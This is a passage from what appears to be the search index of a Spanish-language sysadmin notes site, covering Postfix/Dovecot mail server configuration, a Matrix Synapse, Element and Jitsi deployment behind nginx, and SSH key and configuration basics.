permit_sasl_authenticated,permit_mynetworks,reject_unauth_destination' # configuraci\u00f3n tls ------------------------ sudo postconf -e 'smtpd_use_tls = yes' sudo postconf -e 'smtp_use_tls = yes' # solo admitir comunicaci\u00f3n por tls sudo postconf -e 'smtpd_tls_auth_only = no' # nivel de log sudo postconf -e 'smtpd_tls_loglevel = 1' # incluir informacion de protocolo y nombre comun del cliente en el encabezado sudo postconf -e 'smtpd_tls_received_header = yes' # por defecto la cache es de 300s aumentar a 1h sudo postconf -e 'smtpd_tls_session_cache_timeout = 3600s' Ademas hay que modificar manualmente el archivo master.cf","title":"Conf postfix"},{"location":"administracion/server-correo/#maincf","text":"Ejemplo de archivo main.cf cat /etc/postfix/main.cf #myorigin = /etc/mailname smtpd_banner = $myhostname ESMTP $mail_name ( Debian/GNU ) biff = no # appending .domain is the MUA's job. append_dot_mydomain = no # Uncomment the next line to generate \"delayed mail\" warnings #delay_warning_time = 4h readme_directory = no # See http://www.postfix.org/COMPATIBILITY_README.html -- default to 2 on # fresh installs. compatibility_level = 2 # TLS parameters smtpd_tls_auth_only = no smtpd_use_tls = yes smtp_use_tls = yes smtp_tls_note_starttls_offer = yes smtpd_tls_key_file = /etc/ssl/private/mymail.key smtpd_tls_cert_file = /etc/ssl/certs/mymail.crt smtpd_tls_CAfile = /etc/ssl/certs/cacrt.pem smtpd_tls_loglevel = 1 smtpd_tls_received_header = yes smtpd_tls_session_cache_timeout = 3600s smtpd_tls_session_cache_database = btree: ${ data_directory } /smtpd_scache smtp_tls_session_cache_database = btree: ${ data_directory } /smtp_scache # See /usr/share/doc/postfix/TLS_README.gz in the postfix-doc package for # information on enabling SSL in the smtp client. smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination myhostname = correo.mymail.com alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases myorigin = /etc/mailname mydestination = $myhostname , mymail.com, localhost, localhost.localdomain, localhost relayhost = mynetworks = 192 .168.88.0/24 127 .0.0.0/8 [ ::ffff:127.0.0.0 ] /104 [ ::1 ] /128 mailbox_size_limit = 0 recipient_delimiter = + inet_interfaces = all inet_protocols = all home_mailbox = Maildir/ mailbox_command = # SASL parameters smtpd_sasl_type = dovecot smtpd_sasl_path = private/auth smtpd_sasl_auth_enable = yes smtpd_sasl_tls_security_options = $smtpd_sasl_security_options smtpd_sasl_security_options = noanonymous smtpd_recipient_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination","title":"Main.cf"},{"location":"administracion/server-correo/#mastercf","text":"master.cf submission inet n - y - - smtpd -o smtpd_tls_security_level = encrypt -o smtpd_sasl_auth_enable = yes -o smtpd_sasl_type = dovecot -o smtpd_sasl_path = private/auth -o smtpd_sasl_security_options = noanonymous -o smtpd_sasl_local_domain = mymail.com # -o smtpd_client_restrictions=permit_sasl_authenticated,reject # -o smtpd_sender_login_maps=hash:/etc/postfix/virtual # -o smtpd_sender_restrictions=reject_sender_login_mismatch # -o smtpd_recipient_restrictions=reject_non_fqdn_recipient,reject_unknown_recipient_domain,permit_sasl_authenticated,reject smtps inet n - y - - smtpd -o syslog_name = postfix/smtps -o smtpd_tls_wrappermode = yes -o smtpd_sasl_auth_enable = yes","title":"Master.cf"},{"location":"administracion/server-correo/#conf-dovecot","text":"Secci\u00f3n modificada de archivos de configuraci\u00f3n dovecot.","title":"Conf dovecot"},{"location":"administracion/server-correo/#dovecotconf","text":"... # A comma separated list of IPs or hosts where to listen in for connections. # \"*\" listens in all IPv4 interfaces, \"::\" listens in all IPv6 interfaces. # If you want to specify non-default ports or anything more complex, # edit conf.d/master.conf. listen = *, :: # extender logs para depurar errores ( opcional ) auth_verbose = yes mail_debug = yes ...","title":"dovecot.conf"},{"location":"administracion/server-correo/#10-authconf","text":"# desabilitar autentificaci\u00f3n en texto plano disable_plaintext_auth = yes # %n eliminar dominio en la autenticaci\u00f3n, %Lu minimizar las mayusculas auth_username_format = %Lu %n # Space separated list of wanted authentication mechanisms: # plain login digest-md5 cram-md5 ntlm rpa apop anonymous gssapi otp skey # gss-spnego # NOTE: See also disable_plaintext_auth setting. auth_mechanisms = plain login","title":"10-auth.conf"},{"location":"administracion/server-correo/#10-mailconf","text":"# utilizar Maildir como buzon mail_location = maildir:~/Maildir #mail_location = mbox:~/mail:INBOX=/var/mail/%u mail_privileged_group = mail","title":"10-mail.conf"},{"location":"administracion/server-correo/#10-masterconf","text":"... service imap-login { inet_listener imap { port = 143 } ... } ... service pop3-login { inet_listener pop3 { port = 110 } ... } ... # Postfix smtp-auth unix_listener /var/spool/postfix/private/auth { mode = 0660 user = postfix group = postfix } ...","title":"10-master.conf"},{"location":"administracion/server-correo/#10-sslconf","text":"# SSL/TLS support: yes, no, required. <doc/wiki/SSL.txt> ssl = yes # PEM encoded X.509 SSL/TLS certificate and private key. They're opened before # dropping root privileges, so keep the key file unreadable by anyone but # root. Included doc/mkcert.sh can be used to easily generate self-signed # certificate, just make sure to update the domains in dovecot-openssl.cnf ssl_cert = </etc/ssl/certs/mymail.crt ssl_key = </etc/ssl/private/mymail.key","title":"10-ssl.conf"},{"location":"administracion/server-correo/#20-pop3conf","text":"Esta opcion solo en caso de querer utilizar pop3 # Note that Outlook 2003 seems to have problems with %v.%u format which was # Dovecot's default, so if you're building a new server it would be a good # idea to change this. %08Xu%08Xv should be pretty fail-safe. pop3_uidl_format = %08Xu%08Xv","title":"20-pop3.conf"},{"location":"administracion/server-correo/#opcional-seguridad","text":"Requerir un comando HELO o EHLO v\u00e1lido con un nombre de dominio completamente calificado puede hacer precisamente eso sudo postconf -e 'smtpd_helo_required = yes' sudo postconf -e 'smtpd_helo_restrictions = reject_non_fqdn_helo_hostname,reject_invalid_helo_hostname,reject_unknown_helo_hostname' # desabiliar veryfy para evitar exponer conf de usuario sensible sudo postconf -e 'disable_vrfy_command = yes' Tambi\u00e9n es posible que desee retrasar el mensaje de rechazo para permitir que Postfix registre la informaci\u00f3n de la direcci\u00f3n del destinatario cuando el cliente conectado infringe alguna de las reglas de rechazo. Esto le permite averiguar m\u00e1s tarde a qui\u00e9n intentaban apuntar los spammers. sudo postconf -e 'smtpd_delay_reject = yes' Las restricciones de destinatario de Postfix que se establecieron en la parte de configuraci\u00f3n de SASL son importantes para proteger el servidor al tiempo que permiten a los usuarios conectarse con clientes de correo electr\u00f3nico como Thunderbird o Outlook. Mantener estos par\u00e1metros en el orden correcto conservar\u00e1 esta capacidad, pero puede incluir restricciones adicionales que los mensajes entrantes deber\u00e1n cumplir. sudo postconf -e 'smtpd_recipient_restrictions = permit_sasl_authenticated,permit_mynetworks,reject_unauth_destination,reject_invalid_hostname,reject_non_fqdn_hostname,reject_non_fqdn_sender,reject_non_fqdn_recipient,reject_unknown_sender_domain,reject_rbl_client sbl.spamhaus.org,reject_rbl_client cbl.abuseat.org' Los par\u00e1metros anteriores se explican por s\u00ed mismos, aunque un poco dif\u00edciles de leer en un formato de terminal f\u00e1cil de copiar y pegar. La idea general es rechazar las conexiones de direcciones inventadas que no usan un nombre de dominio completo o simplemente no existen. Aqu\u00ed tambi\u00e9n es posible agregar filtros de spam externos como las listas negras de Spamhaus o CBL. Si desea obtener m\u00e1s informaci\u00f3n, Postfix tiene una documentaci\u00f3n muy extensa sobre sus opciones de configuraci\u00f3n. http://www.postfix.org/postconf.5.html#smtpd_recipient_restrictions","title":"Opcional seguridad"},{"location":"administracion/server-correo/#comprobar-funcionamiento_1","text":"root@debmail:~# openssl s_client -connect correo.mymail.com:993 CONNECTED ( 00000003 ) .... Por aqui en medio sale string sobre el certificado .... * OK [ CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH = PLAIN AUTH = LOGIN ] Dovecot ( Debian ) ready. . login ventas@mymail.com ventas . OK [ CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT = DISPLAY THREAD = REFERENCES THREAD = REFS THREAD = ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL = 1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT = SEARCH LIST-STATUS BINARY MOVE SNIPPET = FUZZY LITERAL+ NOTIFY SPECIAL-USE ] Logged in . select INBOX * FLAGS ( \\A nswered \\F lagged \\D eleted \\S een \\D raft ) * OK [ PERMANENTFLAGS ( \\A nswered \\F lagged \\D eleted \\S een \\D raft \\* )] Flags permitted. * 1 EXISTS * 0 RECENT * OK [ UIDVALIDITY 1609316456 ] UIDs valid * OK [ UIDNEXT 5 ] Predicted next UID . OK [ READ-WRITE ] Select completed ( 0 .033 + 0 .000 + 0 .037 secs ) . . logout * BYE Logging out . OK Logout completed ( 0 .005 + 0 .000 + 0 .005 secs ) . closed","title":"Comprobar funcionamiento"},{"location":"administracion/server-mensajeria/","text":"Server mensajeria instantanea En este documento se explica como desplegar un servidor de mensajeria instantanea sobre un Debian9 muy similar a Slack , pero en este caso utilizo Synapse , Element (riot) y Jitsi . matrix-synapse Matrix es un est\u00e1ndar abierto para comunicaciones sobre IP en tiempo real interoperables y descentralizadas. Este ara de servidor de mensajeria instantanea con comunicaciones cifradas punto a punto y llamadas de audio/v\u00eddeo. Element hace de cliente para acceder a los servidores de Matrix. jitsi es el servidor que se encargara de proporcionar las videollamadas. Prerrequisitos Para esta practica es necesario tener: un dominio o almenos simularlo, usare el dominio ojoaldato.tk subdominios para las diferentes aplicaciones matrix.ojoaldato.tk , riot.ojoaldato.tk , jitsi.ojoaldato.tk en mi caso. Los siguientes puertos deben estar abiertos en su firewall para permitir el tr\u00e1fico al servidor Jitsi Meet: 80/tcp 443/tcp 10000/udp 22/tcp 3478/udp 5349/tcp Instalar nginx Todas las aplicaciones correran sobre nginx, as\u00ed que instalo y configuro el alojamienta de cada una. sudo apt update sudo apt install nginx -y Configurar nginx Creo una configuraci\u00f3n simple para redirijir las peticiones desde mi dominio ojoaldato.tk hasta la p\u00e1gina de inicio del server nginx. sudo vim /etc/nginx/sites-enabled/ojoaldato.tk server { listen 80 ; listen [ :: ] :80 ; server_name ojoaldato.tk ; root /var/www/ojoaldato.tk ; index index.html ; location / { try_files $uri $uri / = 404 ; } } Alojamiento Matrix Creo una configuraci\u00f3n para el alojamiento de Matrix, esta configuraci\u00f3n una vez instale matrix redirigira las peticiones que entren de matrix.ojoaldato.tk hacia el servidor de matrix en localhost:8008 sudo vim /etc/nginx/sites-enabled/matrix.ojoaldato.tk server { listen 80 ; listen [ :: ] :80 ; server_name matrix.ojoaldato.tk ; root /var/www/ojoaldato.tk ; index index.html ; location / { proxy_pass http://localhost:8008 } } Alojamiento Element Creo una configuraci\u00f3n para el alojamiento de Element, esta configuraci\u00f3n una vez instale element redirigira las peticiones que entren de riot.ojoaldato.tk hacia la aplicacion de riot sudo vim /etc/nginx/sites-enabled/riot.ojoaldato.tk server { listen 80 ; listen [ :: ] :80 ; server_name riot.ojoaldato.tk ; root /var/www/riot.ojoaldato.tk/riot ; index index.html ; location / { try_files $uri $uri / = 404 ; } } Generar certificados Estas aplicaciones necesitan un cifrado que conseguiremos gracias a los certificados de LetsEncript con certbot y as\u00ed poder acceder al server mediante https sudo apt install python3-certbot-nginx sudo certbot --nginx -d ojoaldato.tk -d matrix.ojoaldato.tk -d riot.ojoaldato.tk Esta instrucci\u00f3 automaticamente genera los certificados y modifica la configuraci\u00f3n de nginx para el redireccionamiento de http a https , se puede ver abriendo de nuevo los archivos creados anteriormente, y probandolo desde el navegador con nuestro dominio http://ojoaldato.tk Instalar Matrix La instalaci\u00f3n de Matrix requiere a\u00f1adir su repositorio e instalar. # dependencias para a\u00f1adir repo sudo apt install -y lsb-release wget apt-transport-https # a\u00f1adir el repositorio sudo wget -O /usr/share/keyrings/matrix-org-archive-keyring.gpg https://packages.matrix.org/debian/matrix-org-archive-keyring.gpg echo \"deb [signed-by=/usr/share/keyrings/matrix-org-archive-keyring.gpg] https://packages.matrix.org/debian/ $( lsb_release -cs ) main\" | sudo tee /etc/apt/sources.list.d/matrix-org.list # actualizar e instalar sudo apt update sudo apt install matrix-synapse-py3 En la instalaci\u00f3n de matrix te requiere insertar tu dominio, en este caso ojoaldato.tk y decir si quieres que recoja estadisticas de tu servidor ( ya que es una herramienta opensource y queremos que puedan mejorar su c\u00f3digo gracias a ello diremos que YES) Esta configuraci\u00f3n es opcional pero recomendable, lo que permite es reconocer a los usuarios por @user:servername y asi facilitar la vbusqueda entre servidores. # creamos en la ruta donde aloja matrix el siguente archivo sudo mkdir -p /var/www/ojoaldato.tk/.well-known/matrix sudo vim /var/www/ojoaldato.tk/.well-known/matrix/server { \"m.server\" : \"matrix.ojoaldato.tk:443\" } # comprobamos que se puede acceder desde el exterior curl -L https://ojoaldato.tk/.well-known/matrix/server { \"m.server\" : \"matrix.ojoaldato.tk:443\" } TODO Nota: queda pendiente configurar mail Instalar Element Element es el cliente que usaremos para acceder a nuestro servidor matrix, realmente no se instala, simplemente se descarga y luego se configura. # creo el directorio donde se alojara element (riot) sudo mkdir /var/www/riot.ojoaldato.tk # accedo al directorio y descargo element cd /var/www/riot.ojoaldato.tk/ sudo wget https://github.com/vector-im/element-web/releases/download/v1.7.16/element-v1.7.16.tar.gz sudo wget https://github.com/vector-im/element-web/releases/download/v1.7.16/element-v1.7.16.tar.gz.asc # este paso es opcional, solo verifica la descarga sudo gpg --verify element-v1.7.16.tar.gz.asc sudo wget https://packages.riot.im/element-release-key.asc sudo gpg --import element-release-key.asc sudo gpg --verify element-v1.7.16.tar.gz.asc # descomprimo el archivo descargado sudo tar xvzf element-v1.7.16.tar.gz # creo un link al directorio desde donde nginx lo reconocera sudo ln -s element-v1.7.16 riot Configurar Element En los archivos descargados ya nos proporciona una configuraci\u00f3n de ejemplo que copiaremos y modificaremos algunos parametros. base_url : dominio donde vse encuentra el servidor matrix server_name : nuestro dominio jitsi.preferredDonmain : dominio de nuestro server jitsi que instalaremos a continuaci\u00f3n. Esta instrucci\u00f3n lo que hace es indicar nuestro servidor jitsi para las videoconferencias. sudo cp /var/www/riot.ojoaldato.tk/riot/config.sample.json /var/www/riot.ojoaldato.tk/riot/config.json sudo vim /var/www/riot.ojoaldato.tk/riot/config.json { \"default_server_config\" : { \"m.homeserver\" : { \"base_url\" : \"https://matrix.ojoaldato.tk\" , \"server_name\" : \"ojoaldato.tk\" } , ... } , \"jitsi\" : { \"preferredDomain\" : \"jitsi.ojoaldato.tk\" } } Habilitar los registros de usuario y ya podemos acceder a nuestro servidor matrix. sudo vim /etc/matrix-synapse/homeserver.yaml ... enable_registration: true ... # reiniciar/reload server matrix para recargar configuraci\u00f3n sudo systemctl restart matrix-synapse En este punto ya podemos acceder a https://riot.ojoaldato.tk y chatear, pero queremos a\u00f1adir las videoconferencias de nuestro server jitsi. Instalar Jitsi Jitsi es un server de videoconferencias opensource que vamos a integrar a element. Para su instalaci\u00f3n tenemos que a\u00f1adir su repositorio, abrir el firewall para los puertos necesarios en su funcionamiento. # instalar openjdk requerido y a\u00f1adir repo sudo apt install openjdk-8-jdk curl https://download.jitsi.org/jitsi-key.gpg.key | sudo sh -c 'gpg --dearmor > /usr/share/keyrings/jitsi-keyring.gpg' echo 'deb [signed-by=/usr/share/keyrings/jitsi-keyring.gpg] https://download.jitsi.org stable/' | sudo tee /etc/apt/sources.list.d/jitsi-stable.list > /dev/null The following ports need to be open in your firewall, to allow traffic to the Jitsi Meet server: 80 TCP - for SSL certificate verification / renewal with Let's Encrypt 443 TCP - for general access to Jitsi Meet 10000 UDP - for general network video/audio communications 22 TCP - if you access you server using SSH (change the port accordingly if it's not 22) 3478 UDP - for quering the stun server (coturn, optional, needs config.js change to enable it) 5349 TCP - for fallback network video/audio communications over TCP (when UDP is blocked for example), served by coturn sudo ufw allow 80 /tcp sudo ufw allow 443 /tcp sudo ufw allow 10000 /udp sudo ufw allow 22 /tcp sudo ufw allow 3478 /udp sudo ufw allow 5349 /tcp sudo ufw enable sudo ufw status verbose Instalar En la instalaci\u00f3n pide el dominio que usar para acceder a jitsi jitsi.ojoaldato.tk , y si quieres generar certificados automaticamente o si quieres asignar los tuyos propios, en mi caso que se genere automaticamente. sudo apt update sudo apt install jitsi-meet Comprobar desde el navegador http://jitsi.ojoaldato.tk Posibles Houps Posibles errores en la instalaci\u00f3n de jitsi En mi caso no hacia la redirecci\u00f3n automatica de http a https y la he tenido que configurar manualmente, en el archivo de configuraci\u00f3n generado por jitsi. sudo cat /etc/nginx/sites-enabled/jitsi.ojoaldato.tk.conf server_names_hash_bucket_size 64 ; server { if ( $host = jitsi.ojoaldato.tk ) { return 301 https:// $host$request_uri ; } listen 80 ; listen [ :: ] :80 ; server_name jitsi.ojoaldato.tk ; .... sudo systemctl restart nginx Por alguna razon no se han generado los certificados bien, y jitsi ya a pensado en ello, porque trae un script para generarlos. sudo /usr/share/jitsi-meet/scripts/install-letsencrypt-cert.sh Y el server Element con videoconferencias https://riot.ojoaldato.tk","title":"Server mensajeria instantanea"},{"location":"administracion/server-mensajeria/#server-mensajeria-instantanea","text":"En este documento se explica como desplegar un servidor de mensajeria instantanea sobre un Debian9 muy similar a Slack , pero en este caso utilizo Synapse , Element (riot) y Jitsi . matrix-synapse Matrix es un est\u00e1ndar abierto para comunicaciones sobre IP en tiempo real interoperables y descentralizadas. Este ara de servidor de mensajeria instantanea con comunicaciones cifradas punto a punto y llamadas de audio/v\u00eddeo. Element hace de cliente para acceder a los servidores de Matrix. jitsi es el servidor que se encargara de proporcionar las videollamadas.","title":"Server mensajeria instantanea"},{"location":"administracion/server-mensajeria/#prerrequisitos","text":"Para esta practica es necesario tener: un dominio o almenos simularlo, usare el dominio ojoaldato.tk subdominios para las diferentes aplicaciones matrix.ojoaldato.tk , riot.ojoaldato.tk , jitsi.ojoaldato.tk en mi caso. Los siguientes puertos deben estar abiertos en su firewall para permitir el tr\u00e1fico al servidor Jitsi Meet: 80/tcp 443/tcp 10000/udp 22/tcp 3478/udp 5349/tcp","title":"Prerrequisitos"},{"location":"administracion/server-mensajeria/#instalar-nginx","text":"Todas las aplicaciones correran sobre nginx, as\u00ed que instalo y configuro el alojamienta de cada una. sudo apt update sudo apt install nginx -y","title":"Instalar nginx"},{"location":"administracion/server-mensajeria/#configurar-nginx","text":"Creo una configuraci\u00f3n simple para redirijir las peticiones desde mi dominio ojoaldato.tk hasta la p\u00e1gina de inicio del server nginx. sudo vim /etc/nginx/sites-enabled/ojoaldato.tk server { listen 80 ; listen [ :: ] :80 ; server_name ojoaldato.tk ; root /var/www/ojoaldato.tk ; index index.html ; location / { try_files $uri $uri / = 404 ; } }","title":"Configurar nginx"},{"location":"administracion/server-mensajeria/#alojamiento-matrix","text":"Creo una configuraci\u00f3n para el alojamiento de Matrix, esta configuraci\u00f3n una vez instale matrix redirigira las peticiones que entren de matrix.ojoaldato.tk hacia el servidor de matrix en localhost:8008 sudo vim /etc/nginx/sites-enabled/matrix.ojoaldato.tk server { listen 80 ; listen [ :: ] :80 ; server_name matrix.ojoaldato.tk ; root /var/www/ojoaldato.tk ; index index.html ; location / { proxy_pass http://localhost:8008 } }","title":"Alojamiento Matrix"},{"location":"administracion/server-mensajeria/#alojamiento-element","text":"Creo una configuraci\u00f3n para el alojamiento de Element, esta configuraci\u00f3n una vez instale element redirigira las peticiones que entren de riot.ojoaldato.tk hacia la aplicacion de riot sudo vim /etc/nginx/sites-enabled/riot.ojoaldato.tk server { listen 80 ; listen [ :: ] :80 ; server_name riot.ojoaldato.tk ; root /var/www/riot.ojoaldato.tk/riot ; index index.html ; location / { try_files $uri $uri / = 404 ; } }","title":"Alojamiento Element"},{"location":"administracion/server-mensajeria/#generar-certificados","text":"Estas aplicaciones necesitan un cifrado que conseguiremos gracias a los certificados de LetsEncript con certbot y as\u00ed poder acceder al server mediante https sudo apt install python3-certbot-nginx sudo certbot --nginx -d ojoaldato.tk -d matrix.ojoaldato.tk -d riot.ojoaldato.tk Esta instrucci\u00f3 automaticamente genera los certificados y modifica la configuraci\u00f3n de nginx para el redireccionamiento de http a https , se puede ver abriendo de nuevo los archivos creados anteriormente, y probandolo desde el navegador con nuestro dominio http://ojoaldato.tk","title":"Generar certificados"},{"location":"administracion/server-mensajeria/#instalar-matrix","text":"La instalaci\u00f3n de Matrix requiere a\u00f1adir su repositorio e instalar. # dependencias para a\u00f1adir repo sudo apt install -y lsb-release wget apt-transport-https # a\u00f1adir el repositorio sudo wget -O /usr/share/keyrings/matrix-org-archive-keyring.gpg https://packages.matrix.org/debian/matrix-org-archive-keyring.gpg echo \"deb [signed-by=/usr/share/keyrings/matrix-org-archive-keyring.gpg] https://packages.matrix.org/debian/ $( lsb_release -cs ) main\" | sudo tee /etc/apt/sources.list.d/matrix-org.list # actualizar e instalar sudo apt update sudo apt install matrix-synapse-py3 En la instalaci\u00f3n de matrix te requiere insertar tu dominio, en este caso ojoaldato.tk y decir si quieres que recoja estadisticas de tu servidor ( ya que es una herramienta opensource y queremos que puedan mejorar su c\u00f3digo gracias a ello diremos que YES) Esta configuraci\u00f3n es opcional pero recomendable, lo que permite es reconocer a los usuarios por @user:servername y asi facilitar la vbusqueda entre servidores. # creamos en la ruta donde aloja matrix el siguente archivo sudo mkdir -p /var/www/ojoaldato.tk/.well-known/matrix sudo vim /var/www/ojoaldato.tk/.well-known/matrix/server { \"m.server\" : \"matrix.ojoaldato.tk:443\" } # comprobamos que se puede acceder desde el exterior curl -L https://ojoaldato.tk/.well-known/matrix/server { \"m.server\" : \"matrix.ojoaldato.tk:443\" } TODO Nota: queda pendiente configurar mail","title":"Instalar Matrix"},{"location":"administracion/server-mensajeria/#instalar-element","text":"Element es el cliente que usaremos para acceder a nuestro servidor matrix, realmente no se instala, simplemente se descarga y luego se configura. # creo el directorio donde se alojara element (riot) sudo mkdir /var/www/riot.ojoaldato.tk # accedo al directorio y descargo element cd /var/www/riot.ojoaldato.tk/ sudo wget https://github.com/vector-im/element-web/releases/download/v1.7.16/element-v1.7.16.tar.gz sudo wget https://github.com/vector-im/element-web/releases/download/v1.7.16/element-v1.7.16.tar.gz.asc # este paso es opcional, solo verifica la descarga sudo gpg --verify element-v1.7.16.tar.gz.asc sudo wget https://packages.riot.im/element-release-key.asc sudo gpg --import element-release-key.asc sudo gpg --verify element-v1.7.16.tar.gz.asc # descomprimo el archivo descargado sudo tar xvzf element-v1.7.16.tar.gz # creo un link al directorio desde donde nginx lo reconocera sudo ln -s element-v1.7.16 riot","title":"Instalar Element"},{"location":"administracion/server-mensajeria/#configurar-element","text":"En los archivos descargados ya nos proporciona una configuraci\u00f3n de ejemplo que copiaremos y modificaremos algunos parametros. base_url : dominio donde vse encuentra el servidor matrix server_name : nuestro dominio jitsi.preferredDonmain : dominio de nuestro server jitsi que instalaremos a continuaci\u00f3n. Esta instrucci\u00f3n lo que hace es indicar nuestro servidor jitsi para las videoconferencias. sudo cp /var/www/riot.ojoaldato.tk/riot/config.sample.json /var/www/riot.ojoaldato.tk/riot/config.json sudo vim /var/www/riot.ojoaldato.tk/riot/config.json { \"default_server_config\" : { \"m.homeserver\" : { \"base_url\" : \"https://matrix.ojoaldato.tk\" , \"server_name\" : \"ojoaldato.tk\" } , ... } , \"jitsi\" : { \"preferredDomain\" : \"jitsi.ojoaldato.tk\" } } Habilitar los registros de usuario y ya podemos acceder a nuestro servidor matrix. sudo vim /etc/matrix-synapse/homeserver.yaml ... enable_registration: true ... # reiniciar/reload server matrix para recargar configuraci\u00f3n sudo systemctl restart matrix-synapse En este punto ya podemos acceder a https://riot.ojoaldato.tk y chatear, pero queremos a\u00f1adir las videoconferencias de nuestro server jitsi.","title":"Configurar Element"},{"location":"administracion/server-mensajeria/#instalar-jitsi","text":"Jitsi es un server de videoconferencias opensource que vamos a integrar a element. Para su instalaci\u00f3n tenemos que a\u00f1adir su repositorio, abrir el firewall para los puertos necesarios en su funcionamiento. # instalar openjdk requerido y a\u00f1adir repo sudo apt install openjdk-8-jdk curl https://download.jitsi.org/jitsi-key.gpg.key | sudo sh -c 'gpg --dearmor > /usr/share/keyrings/jitsi-keyring.gpg' echo 'deb [signed-by=/usr/share/keyrings/jitsi-keyring.gpg] https://download.jitsi.org stable/' | sudo tee /etc/apt/sources.list.d/jitsi-stable.list > /dev/null The following ports need to be open in your firewall, to allow traffic to the Jitsi Meet server: 80 TCP - for SSL certificate verification / renewal with Let's Encrypt 443 TCP - for general access to Jitsi Meet 10000 UDP - for general network video/audio communications 22 TCP - if you access you server using SSH (change the port accordingly if it's not 22) 3478 UDP - for quering the stun server (coturn, optional, needs config.js change to enable it) 5349 TCP - for fallback network video/audio communications over TCP (when UDP is blocked for example), served by coturn sudo ufw allow 80 /tcp sudo ufw allow 443 /tcp sudo ufw allow 10000 /udp sudo ufw allow 22 /tcp sudo ufw allow 3478 /udp sudo ufw allow 5349 /tcp sudo ufw enable sudo ufw status verbose Instalar En la instalaci\u00f3n pide el dominio que usar para acceder a jitsi jitsi.ojoaldato.tk , y si quieres generar certificados automaticamente o si quieres asignar los tuyos propios, en mi caso que se genere automaticamente. sudo apt update sudo apt install jitsi-meet Comprobar desde el navegador http://jitsi.ojoaldato.tk","title":"Instalar Jitsi"},{"location":"administracion/server-mensajeria/#posibles-houps","text":"Posibles errores en la instalaci\u00f3n de jitsi En mi caso no hacia la redirecci\u00f3n automatica de http a https y la he tenido que configurar manualmente, en el archivo de configuraci\u00f3n generado por jitsi. sudo cat /etc/nginx/sites-enabled/jitsi.ojoaldato.tk.conf server_names_hash_bucket_size 64 ; server { if ( $host = jitsi.ojoaldato.tk ) { return 301 https:// $host$request_uri ; } listen 80 ; listen [ :: ] :80 ; server_name jitsi.ojoaldato.tk ; .... sudo systemctl restart nginx Por alguna razon no se han generado los certificados bien, y jitsi ya a pensado en ello, porque trae un script para generarlos. sudo /usr/share/jitsi-meet/scripts/install-letsencrypt-cert.sh Y el server Element con videoconferencias https://riot.ojoaldato.tk","title":"Posibles Houps"},{"location":"administracion/ssh/","text":"ssh Ssh funciona con parejas de claves p\u00fablica, privada, para una conexi\u00f3n entre hosts. tipos de clave: rsa, dsa,... Al instalarse los paquetes openssh-client, openssh-server directamente se generan las claves de host. Nota: En docker no, se tiene que indicar con ssh-keygen -A para generar las claves de host. Claves Las claves privadas tendr\u00e1n unos permisos de 0600 mientras que las p\u00fablicas 0644 -rw------- 1 debian debian 1 ,8K jun 17 10 :11 id_rsa -rw-r--r-- 1 debian debian 393 jun 17 10 :11 id_rsa.pub -rw------- 1 debian debian 5 ,2K dic 10 18 :09 known_hosts -rw------- 1 debian debian 5 ,2K dic 10 18 :11 authorized_keys Host Las claves de host est\u00e1n en /etc/ssh/ junto a la configuraci\u00f3n. Usuario Las claves de usuario se encuentran en ~/.ssh/ known_host : claves publicas de hosts authoriced_keys : claves publicas de usuarios Autenticaci\u00f3n La autentificaci\u00f3n la hace en dos pasos, identificar el host y despu\u00e9s el usuario. Host Host , es el primero en autenticar, al establecer conexi\u00f3n el remoto env\u00eda su fingerprint al local y le pregunta si es con el realmente si quiere conectar, si es cierto el remoto env\u00eda su clave p\u00fablica al local. Ejemplo fingerprint. ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub 2048 SHA256:rY7+fOVHZ0PAab05HhBwGht0ZdFN60nCucU/xeXT2Mg no comment ( RSA ) Una vez aceptada la conexi\u00f3n el host remoto guarda la clave publica en .ssh/know-host Usuario Usuario es el segundo en autenticarse, y se puede hacer manualmente, a\u00f1adiendo la contrase\u00f1a en cada conexi\u00f3n, o autom\u00e1ticamente, con una clave p\u00fablica de usuario que se guardare el remoto en .ssh/autorized_keys ssh-keygen # generar clave ssh-copy-id local2@172.20.0.3 # enviar al remoto Tambi\u00e9n se puede copiar la clave p\u00fablica (cuidado en no reescribirla) scp .ssh/id_rsa.pub local1@172.20.0.3:.ssh/authorized_keys Transferencia de archivos # genera archivo file local del resultado ls -la remoto ssh local1@172.20.0.3 ls -la > file.txt # genera todo remotamente ssh local1@172.20.0.3 \"ls -la > file.txt\" # comprimir localmente y guarda en remoto tar cvf - /boot | ssh local1@172.20.0.3 \"cat - > boot.tar\" # sshfs sshfs local1@172.20.0.3: /tmp/mnt fusermount -u /tmp/mnt # desde nautilus sftp://local1@172.20.0.3/home/local1 Cliente El cliente ssh tiene 3 propiedades de configuraci\u00f3n. Global es la que menos prioridad tiene, si una orden se duplica en la configuraci\u00f3n de usuario, se aplicar\u00e1 la del usuario. lo mismo pasa con comand line, esta es la que mas prioridad tiene. comand line user config ~/.ssh/config global /etc/ssh/ssh_config Host localhost VisualHostKey no Host * VisualHostKey yes Host 192 .168.80.252 VisualHostKey no PasswordAuthentication no Si un host coincide en distintos filtros, se le aplica el que mas se parezca. Servidor /etc/ssh/sshd_conf /var/run/sshd.pid port 2022 listenAdress <ip por donde entrar> MaxSessions MaxAuthTries numero de intentos de poner password -1 UsePam En el caso en el que coincidan 2 configuraciones de host y user en una conexi\u00f3n, se aplica el primero que encuentra. # sshd_config Match Host 172 .19.0.1 banner /etc/banner Match user local2 banner /etc/banner2 ssh local2@172.19.0.2 baner1 Reload servicio kill -1 <num-servicio> Restricciones Existen m\u00faltiples mecanismos de restricci\u00f3n para el acceso ssh, algunos de ellos, son globales para los servicios de red y otros espec\u00edficos de sshd. Mecanismos de restricci\u00f3n: configuraci\u00f3n del servidor sshd. Configuraci\u00f3n de reglas de PAM Utilizar TCP Wrappers con los ficheros host.allow y host.deny de la configuraci\u00f3n global del sistema. Creaci\u00f3n de Firewalls con iptables. Acceder solo desde 1 ip a un usuario. Esto nos puede servir para configurar remotamente un servidor con la seguridad de que solo se podr\u00e1 hacer mediante 1 